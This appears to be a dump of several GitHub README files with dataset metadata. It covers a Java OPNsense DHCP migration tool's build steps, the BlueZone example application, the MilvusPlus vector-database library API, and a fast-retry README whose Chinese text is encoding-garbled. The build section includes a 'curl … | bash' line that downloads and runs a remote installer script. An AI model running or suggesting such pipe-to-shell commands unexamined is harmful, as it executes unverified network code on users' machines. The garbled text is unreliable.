   - Make sure you UNCKECK the box that says Reboot after restore

Done!

### [Binaries](https://github.com/EasyG0ing1/Migration/releases/latest)
The binaries were compiled and tested in these operating systems

- Windows 11 (build 21996.1)
- MacOS Sonoma 14.2.1
- Ubuntu 22.0.4 LTS (Jammy Jellyfish)

With MacOS or Linux you might need to set the program as executable

```bash
chmod +x migrate
```

No guarantees with older versions of these operating systems.

## Summary of what this utility does
* Loads config.xml into memory
* Loads existing static maps into memory from the `staticmap` xml node
* Loads the Kea subnets from the `subnet4` xml node
* Iterates through each static mapping
  * Compares each IP address with the Kea Subnets you created looking for a match
  * Creates a new Kea DHCP static mapping using the subnet UUID from the matched subnet
  * Assigns a new random UUID to the new static map for Kea
* Converts the new mappings into xml under the node name `reservations`
* Replaces the `reservations` xml node from the original `config.xml` file
* Saves the modified xml to a new file named `new_config.xml`

Every step along the way is checked for problems and if any are found, the program tells you exactly what you need to look for to settle the problem.

# Compiling

If you are a glutton for punishment and you want to compile the code yourself, these instructions will work.

## Windows

[Click Here](compile/Windows.md) to learn how to setup the Windows build environment

After following those instructions, you should have made the `github` folder off the root. If not:

```bash
mkdir C:\github
```

Next

```bash
cd C:\github
git clone https://github.com/EasyG0ing1/Migration.git
cd Migration\compile
compile.bat
```

It could take anywhere from a minute to ten minutes or longer to compile the native image depending on your CPU and how
much RAM you have. Be patient!

The executable will be here `C:\github\Migration\target\migrate.exe`

## MacOS and Linux

- First, install SDK Man
```shell
curl -s ""https://get.sdkman.io"" | bash
```
- It will give you a command to copy and paste into terminal that will source the config, or simply restart your terminal.
- Next, install GraalVM v21
```shell
sdk install java 21.0.2-graal
```
(this takes about a minute-ish)
- Install Maven
  - Pick a folder to hold the maven file tree
  - Go into that folder
```shell
cd /My/Folder
wget https://dlcdn.apache.org/maven/maven-3/3.9.6/binaries/apache-maven-3.9.6-bin.zip
unzip apache-maven-3.9.6-bin.zip
mv apache-maven-3.9.6 maven3.9.6
```
- Edit whatever file you use to run exports when your shell starts and add
```shell
export PATH=""/My/Path/To/maven3.9.6/bin"":$PATH
```
- Run that command in your terminal too so that you don't need to restart terminal
- Run this and expect the output shown here
```shell
mvn --version
```
Output
```text
Apache Maven 3.9.6
Maven home: /My/Path/To/maven3.9.6/libexec
Java version: 21, vendor: Oracle Corporation, runtime: /Library/Java/JavaVirtualMachines/graalvm-jdk-21+35.1/Contents/Home
```

- If you're using MacOS and you DON'T have the xcode command line tools installed, run this
```shell
xcode-select install
```
- And it will take a LOOOONG time to finish - possibly up to 20 minutes or longer. Get some coffee or water or popcorn ...
- If you're using Linux, then you need to install this
```shell
sudo apt update
sudo apt install build-essential libz-dev zlib1g-dev -y
```
- This won't take too long to install
  - We're back to ALL OS's from here
- Next, go into a folder you can clone this repository into then
```shell
git clone https://github.com/EasyG0ing1/Migration.git
cd Migration
chmod +x compile.sh
./compile.sh
ls -l target
```

- It can take some time to build the native-image. On a 2019 MBP it takes about a minute. On older hardware it can take
  up to 10 minutes or more, it depends on your CPU and how much RAM you have. Just be patient, if there is a problem, it
  will throw an error and dump out so if that didn't happen, then it's working.
- You should see the `migrate` binary in the target folder.
- You may need to set it as executable
 ```shell
chmod +x target/migrate
```

# Issues
If you have any problems that you can't figure out, create an issue and I will be happy to assist.

### Contributing
Create an Issue or a Pull Request if you want to contribute to the project.

### Updates

* 2.2.0
    * Cleaned up code to simplify
    * Removed unused pojos
    * Added enums Package
    * Added migrate Package
    * Added Migrate class
    * Cleaned up Message class and removed unused objects
    * Added Mode enum

* 2.1.4
  * Modified handling of ISC DHCP mappings when no MAC address exists where a CID value is provided
  * Updated the static mapping error messages so that they include relevant details from the static map, making it easier to locate the record for correction 
 
* 2.1.3
  * Minor changes to code structure
 
* 2.1.2
  * Fixed problem where xml tags were in the wrong case in the `new_config.xml`
 
* 2.1.1
  * Added clear and expanded error messages so that any problems that might happen should always present the user with a clear and exact cause of the problem along with instructions explaining how to correct the problem

* 2.1.0
  * Removed the need to run a check before doing the migration
  * Users will get specific feedback if there are any problems which will let them know exactly what is wrong if there are any problems with the migration.

* 2.0.1
  * Minor enhancements

* 2.0.0
  * Streamlined use of XML library, eliminating unnecessary calls.
  * Program now outputs a file that can be directly imported into OPNsense

* 1.0.1
  * Added more detailed error reporting

* 1.0.0
  * Initial Release
",3,0,1,0.0,"['migration', 'here', 'video', 'tutorial', 'work', 'best', 'this', 'simple', 'tool', 'use', 'binary', 'http', 'summary', 'utility', 'compile', 'window', 'macos', 'linux', 'issue', 'contribute', 'update']","['migration', 'here', 'video', 'tutorial', 'work']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-jar-plugin,org.codehaus.mojo:versions-maven-plugin,org.graalvm.buildtools:native-maven-plugin]",0.0,1.0,0.0
HexArchBook/bluezone_pro,main,"# BlueZone
## An example application implementing Hexagonal Architecture

![BlueZone: Hexagonal Application Figure](bluezone.png)

__BlueZone__ allows car drivers to pay remotely for parking cars at regulated zones in a city, instead of paying with coins using parking meters.

- Driving actors using the application are _car drivers_ and _parking inspectors_.

  - Car drivers will access the application using a Web UI (User Interface), and they can do the following:
    
    - Ask for the available rates in the city, in order to choose the one of the zone they want to park the car at.
    - Buy a ticket for parking the car during a period of time at a regulated zone. This period starts at current date-time. The ending date-time is calculated from the paid amount, according to the rate (euros/hour) of the zone.

  - Parking inspectors will access the application using a terminal with a CLI (Command Line Interface), and they can do the following:
  
    - Check a car for issuing a fine, in case that the car is illegally parked at a zone. This will happen if there is no active ticket for the car and the rate of the zone. A ticket is active if current date-time is between the starting and ending date-time of the ticket period.
    
- Driven actors needed by the application are:

  - Repository with the data (rates and tickets) used in the application. It also has a sequence for getting ticket codes as they are needed.

  - Payment service that allows the car driver to buy tickets using a card. Obviously, no adapter for a real service has been developed, just a test-double (mock).

  - Date-time service for obtaining the current date-time when needed, for buying a ticket and for checking a car.

### Development environment:

- Java 17 (OpenJDK version 17.0.2)

- Maven 3.9.5

- IntelliJ IDEA 2023.1.5 (Community Edition)

- Ubuntu 20.04.6 LTS (Linux 5.15.0-86-generic)

### Instructions:

- Download and extract this GitHub repo to a local directory on your computer ( `<bluezone_dir>` )

- Compile all modules (you need to do this just the first time before running):

    ~~~
    cd <bluezone_dir>
    ./scripts/build.sh
    ~~~

- Select the adapters to be plugged-in at each port, editing the ""ports_adapters.properties"" file, located in the ""<bluezone_dir>/config"" directory.
 
- Initialize the driven actors as you need, editing the ""driven_actors.properties"" file, located in the ""<bluezone_dir>/config/driven-side"" directory.

- Run the driving actor you want by executing the script:

    ~~~
    cd <bluezone_dir>
    ./scripts/run_forparkingcars.sh
  ~~~

or

  ~~~
    cd <bluezone_dir>
    ./scripts/run_forissuingfines.sh
  ~~~

- If you chose to run the Web UI at the ""for parking cars"" port, the URL is http://localhost:8080/bluezone/",0,0,1,0.0,"['bluezone', 'an', 'example', 'application', 'implement', 'hexagonal', 'architecture', 'development', 'environment', 'instruction']","['bluezone', 'an', 'example', 'application', 'implement']",13.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,12.0,1.0
dromara/MilvusPlus,main,"# MilvusPlus: Enhanced Vector Database Operations Library

## Project Introduction

<div style=""display: inline-block; border: 4px solid #ccc; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); margin: 10px; padding: 10px;"">
  <img src=""./logo/milvus.png"" alt=""MilvusPlus"" style=""border-radius: 10px;"" />
</div>

> ğŸ”¥ğŸ”¥ğŸ”¥ [MilvusPlus](https://milvusplus.cn/) (short for MP) is an operational tool for [Milvus](https://milvus.io), designed to simplify interactions with the Milvus vector database, providing developers with an intuitive API similar to MyBatis-Plus annotations and method call style, born to improve efficiency.

## Features

- **Non-Invasive**: It only enhances without making changes; its introduction will not affect existing projects, as smooth as silk.
- **Low Overhead**: It automatically injects basic CRUD operations upon startup, with almost no performance loss, and operates directly on objects.
- **Powerful CRUD Operations**: The universal MilvusMapper can achieve CRUD operations with just a small amount of configuration, and has a powerful condition builder to meet all kinds of usage needs.
- **Intuitive API**: The direct API design simplifies database operations, and MilvusService provides a rich API.
- **Support for Lambda-style Calls**: Lambda expressions make it easy to write various query conditions without worrying about field errors.
- **Support for Automatic Primary Key Generation**: Perfectly solves the primary key issue.
- **Support for Custom Global Operations**: Supports global method injection.
- **Annotation-based Configuration**: Uses an annotation method similar to MyBatis-Plus to configure entity models.
- **Easy to Extend**: The core design focuses on extensibility.
- **Type Safety**: Uses Java type safety to reduce errors.

## Quick Start

Custom extension support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-core</artifactId>
    <version>2.1.4</version>
</dependency>
```

Spring application support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-boot-starter</artifactId>
    <version>2.1.4</version>
</dependency>
```

Solon application support:

```
<dependency>
    <groupId>org.dromara</groupId>
    <artifactId>milvus-plus-solon-plugin</artifactId>
    <version>2.1.4</version>
</dependency>
```

## Notes

- Version 2.0.0 requires the use of index annotations to define indexes; otherwise, an error will occur at startup, and adding them later will be ineffective, requiring the collection to be deleted first.
- Version 2.0.0 has not yet released the MilvusService functionality.

## Configuration File

```
milvus:
  uri: https://in03-a5357975ab80da7.api.gcp-us-west1.zillizcloud.com
  token: x'x'x'x
  enable: true
  packages:
    - com.example.entity
```

- `milvus`: Defines configurations related to the Milvus service.
    - `uri`: The URI of the Milvus service, through which the application communicates with the Milvus service.
    - `token`: A token for verification and authorization, ensuring the security of access to the Milvus service.
    - `enable`: A boolean value indicating whether the Milvus module should be enabled.
    - `packages`: These packages contain Java classes corresponding to custom annotations, which you can consider as the package where your custom entity classes are located.

## Application Scenarios

- **Similarity Search**: Quickly retrieve items most similar to a given vector.
- **Recommendation System**: Recommend relevant content based on user behavior and preferences.
- **Image Retrieval**: Find the most similar images to the query image in a large-scale image library.
- **Natural Language Processing**: Convert text into vectors and perform semantic searches.
- **Bioinformatics**: Analyze and compare biological sequences, such as protein and genomic data.

## Detailed Explanation of Custom Annotations

Using custom annotations to automate the integration of the Milvus database provides the following significant advantages:

- **Simplifies the Development Process**: The database structure is declared directly in the code through annotations, without the need to manually create collections, attributes, indexes, and partitions. The project starts automatically and builds, reducing the need to manually write Milvus API calls.
- **Improves Development Efficiency**: The annotation-driven approach makes the creation and management of the database structure more convenient, speeding up development.
- **Enhances Code Readability**: Tightly integrates the definition of the database structure with business logic code, improving the readability and maintainability of the code.
- **Reduces Errors**: Automated creation of the database structure reduces the possibility of human errors, improving the stability of the system.
- **Easy to Maintain**: The use of annotations makes changes to the database structure more centralized and clear, facilitating later maintenance and upgrades.

### @ExtraParam Annotation

- **Purpose**: Defines additional parameters for indexes or other custom functions.
- **Attributes**:
    - `key()`: The key name of the parameter.
    - `value()`: The value of the parameter.

### @MilvusCollection Annotation

- **Purpose**: Defines a collection in the Milvus database.
- **Attributes**:
    - `name()`: The name of the collection.

### @MilvusField Annotation

- **Purpose**: Defines a field in the Milvus collection.
- **Attributes**:
    - `name()`: The field name, defaulting to the Java field name.
    - `dataType()`: The data type, defaulting to `FLOAT_VECTOR`.
    - `dimension()`: The vector dimension, defaulting to -1.
    - `isPrimaryKey()`: Whether it is the primary key, defaulting to false.
    - `autoID()`: Whether to automatically generate an ID, defaulting to false.
    - `description()`: The field description, defaulting to empty.
    - `elementType()`: The element type, defaulting to `None`.
    - `maxLength()`: The maximum length, defaulting to -1.
    - `maxCapacity()`: The maximum capacity, defaulting to -1.
    - `isPartitionKey()`: Whether it is a partition key, defaulting to false.

### @MilvusIndex Annotation

- **Purpose**: Defines an index in the Milvus collection.
- **Attributes**:
    - `indexType()`: The index type, defaulting to `FLAT`.
    - `metricType()`: The metric type, defaulting to `L2`.
    - `indexName()`: The index name, defaulting to empty.
    - `extraParams()`: Additional parameters, defined using the `ExtraParam` annotation.

### @MilvusPartition Annotation

- **Purpose**: Defines partitions of the Milvus collection.
- **Attributes**:
    - `name()`: An array of partition names.

Through these annotations, developers can easily define and manage the structure of the Milvus database, achieving the goal of automatically building the required database structure when the project starts.

## Detailed Explanation of Index and Metric Types

### Index Types (IndexType)

- **INVALID**: An invalid index type, used only for internal marking.
- **FLAT**: Brute force search, suitable for small-scale datasets.
- **IVF_FLAT**: Inverted file flat mode, suitable for medium-scale datasets.
- **IVF_SQ8**: Inverted file quantization mode, suitable for large-scale datasets, sacrificing accuracy for speed.
- **IVF_PQ**: Inverted file product quantization mode, suitable for large-scale high-dimensional datasets, balancing speed and accuracy.
- **HNSW**: Hierarchical navigation small-world graph, providing fast search, suitable for large-scale datasets.
- **DISKANN**: Disk-based approximate nearest neighbor search, suitable for large-scale datasets stored on disk.
- **AUTOINDEX**: Automatically selects the optimal index type.
- **SCANN**: Accelerates search using scanning and tree structures.
- **GPU_IVF_FLAT, GPU_IVF_PQ**: GPU-accelerated indexes, suitable for GPU environments.
- **BIN_FLAT, BIN_IVF_FLAT**: Dedicated index for binary vectors.
- **TRIE**: A dictionary tree index suitable for string types.
- **STL_SORT**: A sorting index suitable for scalar fields.

### Metric Types (MetricType)

- **INVALID**: An invalid metric type, used only for internal marking.
- **L2**: Euclidean distance, suitable for floating-point vectors.
- **IP**: Inner product, used for calculating cosine similarity.
- **COSINE**: Cosine similarity, suitable for text and image searches.
- **HAMMING**: Hamming distance, suitable for binary vectors.
- **JACCARD**: Jaccard similarity coefficient, suitable for set similarity calculations.

## MilvusMapper Functionality

`MilvusMapper` is a general-purpose interface for operating the Milvus database, providing a series of data manipulation methods, including querying, deleting, updating, and inserting. The following is a functional description of `MilvusMapper` and its related classes:

### MilvusMapper<T>

`MilvusMapper` is a generic abstract class that inherits from `BaseMilvusMapper`, providing basic methods for interacting with the Milvus client.

- **Get Milvus Client**: `getClient()` - Returns a `MilvusClientV2` instance.

### BaseMilvusMapper<T>

`BaseMilvusMapper` is an abstract class that defines basic operations for interacting with the Milvus database.

- **Create Search Builder Instance**: `queryWrapper()` - Creates a `LambdaQueryWrapper` instance.
- **Create Delete Builder Instance**: `deleteWrapper()` - Creates a `LambdaDeleteWrapper` instance.
- **Create Update Builder Instance**: `updateWrapper()` - Creates a `LambdaUpdateWrapper` instance.
- **Create Insert Builder Instance**: `insertWrapper()` - Creates a `LambdaInsertWrapper` instance.

#### Data Operations

- **Get Data by ID**: `getById(Serializable ... ids)`
    - **Function**: Query data based on the provided list of IDs.
    - **Parameters**: `ids` - A list of serializable IDs.
    - **Return**: `MilvusResp<List<MilvusResult<T>>>` - The response containing the query results.

- **Delete Data**: `removeById(Serializable ... ids)`
    - **Function**: Delete data based on the provided list of IDs.
    - **Parameters**: `ids` - A list of serializable IDs.
    - **Return**: `MilvusResp<DeleteResp>` - The response of the deletion operation.

- **Update Data**: `updateById(T ... entity)`
    - **Function**: Update data based on the provided entities.
    - **Parameters**: `entity` - A list of entity objects.
    - **Return**: `MilvusResp<UpsertResp>` - The response of the update operation.

- **Insert Data**: `insert(T ... entity)`
    - **Function**: Insert the provided entities into the database.
    - **Parameters**: `entity` - A list of entity objects.
    - **Return**: `MilvusResp<InsertResp>` - The response of the insertion operation.

#### Builder Methods

- **Create General Builder Instance**: `lambda(Wrapper<W, T> wrapper)` - Initializes and returns a builder instance.

### LambdaQueryWrapper<T> Class Functional Documentation

`LambdaQueryWrapper<T>` is a builder class used to construct and execute Milvus search queries. It provides a series of methods to set query parameters and ultimately execute the query.

#### Constructors

- **LambdaQueryWrapper()**: No-argument constructor.
- **LambdaQueryWrapper(String collectionName, MilvusClientV2 client, ConversionCache conversionCache, Class<T> entityType)**: Constructor that initializes the collection name, Milvus client, type conversion cache, and entity type.

#### Partition Settings

- **partition(String ... partitionName)**: Adds one or more partition names to the query.
- **partition(FieldFunction<T,?>... partitionName)**: Adds partition names based on the provided field functions.

#### Search Parameter Settings

- **searchParams(Map<String, Object> searchParams)**: Sets search parameters.

- The following are the parameters supported by searchParams and their descriptions:
    - metric_type
      Type: String
      Description: Specifies the metric type used for the search operation. It must be consistent with the metric type used when indexing vector fields.
      Optional values:
      L2: Euclidean distance, suitable for vector searches in high-dimensional spaces.
      IP: Inner product, suitable for cosine similarity searches.
      COSINE: Cosine similarity, the same as inner product, suitable for measuring the angle between vectors.
      Example:
      searchParams.put(""metric_type"", ""L2"");
    - radius
      Type: float
      Description: Sets the minimum similarity threshold for the search operation. When metric_type is set to L2, this value should be greater than range_filter; otherwise, it should be less than range_filter.
      Example:
      searchParams.put(""radius"", 0.5f);
    - range_filter
      Type: float
      Description: Limits the similarity range of the search operation. When metric_type is set to IP or COSINE, this value should be greater than radius; otherwise, it should be less than radius.
      Example:
      searchParams.put(""range_filter"", 0.3f);
      Use Example
      The following is an example of using searchParams, showing how to build a search request and set specific search parameters:

```java
Map<String, Object> searchParams = new HashMap<>();
searchParams.put(""metric_type"", ""L2"");
searchParams.put(""radius"", 0.5f);
searchParams.put(""range_filter"", 0.3f);
```

- **radius(Object radius)**: Sets the search radius.
- **rangeFilter(Object rangeFilter)**: Sets the range filter.
- **metricType(Object metric_type)**: Sets the metric type.

#### Result Settings

- **outputFields(List<String> outputFields)**: Sets the fields to be returned.
- **roundDecimal(int roundDecimal)**: Sets the number of decimal places for the returned distance values.

#### Query Condition Construction

- **eq(String fieldName, Object value)**: Adds an equal condition.
- **ne(String fieldName, Object value)**: Adds a not equal condition.
- **gt(String fieldName, Object value)**: Adds a greater than condition.
- **ge(String fieldName, Object value)**: Adds a greater than or equal condition.
- **lt(String fieldName, Object value)**: Adds a less than condition.
- **le(String fieldName, Object value)**: Adds a less than or equal condition.
- **between(String fieldName, Object start, Object end)**: Adds a range condition.
- **isNull(String fieldName)**: Adds a null check condition.
- **isNotNull(String fieldName)**: Adds a not null check condition.
- **in(String fieldName, List<?> values)**: Adds an IN condition.
- **like(String fieldName, String value)**: Adds a LIKE condition.

#### JSON and Array Operations

- **jsonContains(String fieldName, Object value)**: Adds a JSON contains condition.
- **jsonContainsAll(String fieldName, List<?> values)**: Adds a JSON contains all values condition.
- **jsonContainsAny(String fieldName, List<?> values)**: Adds a JSON contains any value condition.
- **arrayContains(String fieldName, Object value)**: Adds an array contains condition.
- **arrayContainsAll(String fieldName, List<?> values)**: Adds an array contains all values condition.
- **arrayContainsAny(String fieldName, List<?> values)**: Adds an array contains any value condition.
- **arrayLength(String fieldName, int length)**: Adds an array length condition.

#### Logical Operations

- **and(ConditionBuilder<T> other)**: Adds an AND condition.
- **or(ConditionBuilder<T> other)**: Adds an OR condition.
- **not()**: Adds a NOT condition.

#### Vector Search Settings

- **annsField(String annsField)**: Sets the vector field to be searched.
- **vector(List<?> vector)**: Adds the vector to be searched.
- **vector(String annsField, List<?> vector)**: Sets the vector field and adds the vector to be searched.
- **topK(Integer topK)**: Sets the top-k results to be returned.
- **limit(Long limit)**: Sets the limit on the number of query results.

#### Executing Queries

- **query()**: Builds and executes the search request, returning a wrapped `MilvusResp` object containing the query results.
- **query(FieldFunction<T,?> ... outputFields)**: Sets the output fields and executes the query.
- **query(String ... outputFields)**: Sets the output fields and executes the query.
- **getById(Serializable ... ids)**: Gets data by ID.

#### Helper Methods

- **buildSearch()**: Builds a complete search request object.
- **buildQuery()**: Builds a query request object.

The `LambdaQueryWrapper<T>` class provides a wealth of methods to build complex search queries, supporting various conditions, logical operations, JSON and array operations, and vector searches. By calling these methods in a chain, users can flexibly construct search requests and obtain the desired query results.

### LambdaDeleteWrapper<T>

`LambdaDeleteWrapper` is a builder class used to construct and execute deletion operations.

- **Add Partition**: `partition(String partitionName)`
- **Add Equal Condition**: `eq(String fieldName, Object value)`
- **Add Not Equal Condition**: `ne(String fieldName, Object value)`
- **Add ID to Deletion List**: `id(Object id)`

#### Executing Deletion

- **Execute Deletion**: `remove()` - Builds and executes the deletion request.
- **Delete by ID**: `removeById(Serializable ... ids)`

### LambdaUpdateWrapper<T>

`LambdaUpdateWrapper` is a builder class used to construct and execute update operations.

- **Add Partition**: `partition(String partitionName)`
- execute insertion operations.

- **Add Partition**: `partition(String partitionName)`
- **Add Field Value**: `put(String fieldName, Object value)`

#### Executing Insertion

- **Insert Data**: `insert()` - Builds and executes the insertion request.
- **Insert Multiple Data**: `insert(T ... t)`

## MilvusService Functionality

`MilvusService` is a comprehensive service that provides full management of the Milvus database. It implements multiple interfaces: `IAMService` (Identity and Access Management Service), `ICMService` (Collection Management Service), and `IVecMService` (Vector Management Service).

### Identity and Access Management (IAMService)

The `IAMService` interface provides functions for creating, deleting, querying users and roles, as well as granting and revoking permissions.

- **Create Role**: `createRole(String roleName)`
- **Create User**: `createUser(String userName, String password)`
- **Describe Role Permissions**: `describeRole(String roleName)`
- **Describe User Information**: `describeUser(String userName)`
- **Drop Role**: `dropRole(String roleName)`
- **Drop User**: `dropUser(String userName)`
- **Grant Role Permissions**: `grantPrivilege(String roleName, String objectType, String privilege, String objectName)`
- **Grant User Role**: `grantRole(String roleName, String userName)`
- **List All Roles**: `listRoles()`
- **List All Users**: `listUsers()`
- **Revoke Role Permissions**: `revokePrivilege(String roleName, String objectType, String privilege, String objectName, String databaseName)`
- **Revoke User Role**: `revokeRole(String roleName, String userName)`
- **Update User Password**: `updatePassword(String userName, String password, String newPassword)`

### Collection Management (ICMService)

The `ICMService` interface provides functions for creating, deleting, querying, renaming, and managing indexes of collections.

- **Create Collection**: `createCollection(MilvusEntity milvusEntity)`
- **Add Field**: `addField(String collectionName, AddFieldReq ... addFieldReq)`
- **Get Field**: `getField(String collectionName, String fieldName)`
- **Describe Collection**: `describeCollection(String collectionName)`
- **Drop Collection**: `dropCollection(String collectionName)`
- **Check if Collection Exists**: `hasCollection(String collectionName)`
- **Get Collection Statistics**: `getCollectionStats(String collectionName)`
- **Rename Collection**: `renameCollection(String oldCollectionName, String newCollectionName)`
- **Create Index for Collection**: `createIndex(String collectionName, List<IndexParam> indexParams)`
- **Describe Index of Collection**: `describeIndex(String collectionName, String fieldName)`
- **Drop Index of Collection**: `dropIndex(String collectionName, String fieldName)`
- **Get Loading Status of Collection or Partition**: `getLoadState(String collectionName, String partitionName)`
- **Load Collection Data into Memory**: `loadCollection(String collectionName)`
- **Release Collection Data from Memory**: `releaseCollection(String collectionName)`
- **Create Partition in Collection**: `createPartition(String collectionName, String partitionName)`
- **Drop Partition in Collection**: `dropPartition(String collectionName, String partitionName)`
- **Check if Partition Exists**: `hasPartition(String collectionName, String partitionName)`
- **List All Partitions in Collection**: `listPartitions(String collectionName)`
- **Load Partitions of Collection into Memory**: `loadPartitions(String collectionName, List<String> partitionNames)`
- **Release Partitions of Collection from Memory**: `releasePartitions(String collectionName, List<String> partitionNames)`

### Vector Management (IVecMService)

The `IVecMService` interface provides functions for inserting, updating, querying, deleting vectors, and performing similarity searches.

- **Delete Entities**: `delete(String collectionName, String partitionName, String filter, List<Object> ids)`
- **Get Entities by ID**: `get(String collectionName, String partitionName, List<Object> ids, List<String> outputFields)`
- **Insert Data**: `insert(String collectionName, List<JSONObject> data, String partitionName)`
- **Query by Scalar Filter Condition**: `query(String collectionName, List<String> partitionNames, List<String> outputFields, List<Object> ids, String filter, ConsistencyLevel consistencyLevel, long offset, long limit)`
- **Perform Vector Similarity Search**: `search(String collectionName, List<String> partitionNames, String annsField, int topK, String filter, List<String> outputFields, List<Object> data, long offset, long limit, int roundDecimal, Map<String, Object> searchParams, long guaranteeTimestamp, long gracefulTime, ConsistencyLevel consistencyLevel, boolean ignoreGrowing)`
- **Upsert Data**: `upsert(String collectionName, String partitionName, List<JSONObject> data)`

### Public Method

In addition to the above functionalities, `MilvusService` also provides a public method to obtain a `MilvusClientV2` instance:

- **Get Milvus Client**: `getClient()`

## Usage Example

Here is an example of using MilvusPlus for vector search:

Example usage:


```java

@Data
@MilvusCollection(name = ""face_collection"") // Specifies the name of the Milvus collection
public class Face {
    @MilvusField(
            name = ""person_id"", // Field Name
            dataType = DataType.Int64, // Data type is 64-bit integer
            isPrimaryKey = true // Mark as Primary Key
    )
    private Long personId; // Unique identifier of the person

    @MilvusField(
            name = ""face_vector"", // Field Name
            dataType = DataType.FloatVector, // The data type is a floating point vector
            dimension = 128 // Vector dimension, assuming that the dimension of the face feature vector is 128
    )
    @MilvusIndex(
            indexType = IndexParam.IndexType.IVF_FLAT, // Using the IVF FLAT index type
            metricType = IndexParam.MetricType.L2, // Using the L 2 Distance Metric Type
            indexName = ""face_index"", // Index Name
            extraParams = { // Specify additional index parameters
                    @ExtraParam(key = ""nlist"", value = ""100"") // For example, the nlist parameter for IVF
            }
    )
    private List<Float> faceVector; // Storing vectors of face features
}
```
```
@Component
public class FaceMilvusMapper extends MilvusMapper<Face> {
    
}

@Component
@Slf4j
public class ApplicationRunnerTest implements ApplicationRunner {
    private final FaceMilvusMapper mapper;

    public ApplicationRunnerTest(FaceMilvusMapper mapper) {
        this.mapper = mapper;
    }

    @Override
    public void run(ApplicationArguments args){
        Face face=new Face();
        List<Float> vector = new ArrayList<>();
        for (int i = 0; i < 128; i++) {
            vector.add((float) (Math.random() * 100)); // Using random numbers here as an example only
        }
        face.setPersonId(1l);
        face.setFaceVector(vector);
        
        // add
        List<Face> faces=new ArrayList<>();
        for (int i = 1; i < 10 ;i++){
            Face face1=new Face();
            face1.setPersonId(Long.valueOf(i));
            List<Float> vector1 = new ArrayList<>();
            for (int j = 0; j < 128; j++) {
                vector1.add((float) (Math.random() * 100)); // Using random numbers here as an example only
            }
            face1.setFaceVector(vector1);
            faces.add(face1);
        }
        MilvusResp<InsertResp> insert = mapper.insert(faces.toArray(faces.toArray(new Face[0]))); log.info(""insert--{}"", JSONObject.toJSONString(insert));
        
        // id query
        MilvusResp<List<MilvusResult<Face>>> query = mapper.getById(9l);
        log.info(""query--getById---{}"", JSONObject.toJSONString(query));
        
        // VECTOR QUERY
        MilvusResp<List<MilvusResult<Face>>> query1 = mapper.queryWrapper()
                .vector(Face::getFaceVector, vector)
                .ne(Face::getPersonId, 1L)
                .topK(3)
                .query();
        log.info(""VectorQuery query--queryWrapper---{}"", JSONObject.toJSONString(query1));
        
        // SCALAR QUERY
        MilvusResp<List<MilvusResult<Face>>> query2 = mapper.queryWrapper()
                .eq(Face::getPersonId, 2L)
                .limit(3)
                .query();
        log.info(""ScalarQuery   query--queryWrapper---{}"", JSONObject.toJSONString(query2));
        
        // update
        vector.clear();
        for (int i = 0; i < 128; i++) {
            vector.add((float) (Math.random() * 100)); // Using random numbers here as an example only
        }
        MilvusResp<UpsertResp> update = mapper.updateById(face);log.info(""update--{}"", JSONObject.toJSONString(update));
        
        // id Query
        MilvusResp<List<MilvusResult<Face>>> query3 = mapper.getById(1L);log.info(""query--getById---{}"", JSONObject.toJSONString(query3));
        
        // del
        MilvusResp<DeleteResp> remove = mapper.removeById(1L);log.info(""remove--{}"", JSONObject.toJSONString(remove));
        
        // query
        MilvusResp<List<MilvusResult<Face>>> query4 = mapper.getById(1L);log.info(""query--{}"", JSONObject.toJSONString(query4));

    }
}
```

## Contributing

Contributions are welcome!

- Report issues or suggest features by [opening an issue](https://github.com/yourusername/MilvusPlus/issues/new).
- Submit changes by [creating a pull request](https://github.com/yourusername/MilvusPlus/compare).

## License

MilvusPlus is open source and available under the [License](https://github.com/yourusername/MilvusPlus/blob/master/LICENSE).

## Contact

For questions or support, reach out to [javpower@163.com](mailto:javpower@163.com).
",0,1,1,4.0,"['milvusplus', 'enhanced', 'vector', 'database', 'operation', 'library', 'project', 'introduction', 'feature', 'quick', 'start', 'note', 'configuration', 'file', 'application', 'scenario', 'detailed', 'explanation', 'custom', 'annotation', 'extraparam', 'annotation', 'milvuscollection', 'annotation', 'milvusfield', 'annotation', 'milvusindex', 'annotation', 'milvuspartition', 'annotation', 'detail', 'explanation', 'index', 'metric', 'type', 'index', 'type', 'indextype', 'metric', 'type', 'metrictype', 'milvusmapper', 'functionality', 'milvusmapper', 't', 'basemilvusmapper', 't', 'data', 'operation', 'builder', 'method', 'lambdaquerywrapper', 't', 'class', 'functional', 'documentation', 'constructor', 'partition', 'setting', 'search', 'parameter', 'setting', 'result', 'setting', 'query', 'condition', 'construction', 'json', 'array', 'operation', 'logical', 'operation', 'vector', 'search', 'setting', 'execute', 'query', 'helper', 'method', 'lambdadeletewrapper', 't', 'execute', 'deletion', 'lambdaupdatewrapper', 't', 'execute', 'insertion', 'milvusservice', 'functionality', 'identity', 'access', 'management', 'iamservice', 'collection', 'management', 'icmservice', 'vector', 'management', 'ivecmservice', 'public', 'method', 'usage', 'example', 'contribute', 'license', 'contact']","['annotation', 't', 'operation', 'setting', 'vector']",8.0,"[ org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.codehaus.mojo:flatten-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,6.0,2.0
burukeYou/fast-retry,main,"
 [![License](http://img.shields.io/badge/license-apache%202-brightgreen.svg)](https://github.com/burukeYou/fast-retry/blob/main/LICENSE)


# What is this?
Fast-Retryæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ä»»åŠ¡é‡è¯•æ¡†æ¶ï¼Œæ”¯æŒç™¾ä¸‡çº§åˆ«ä»»åŠ¡çš„å¹¶å‘é‡è¯•å¤„ç†ã€‚
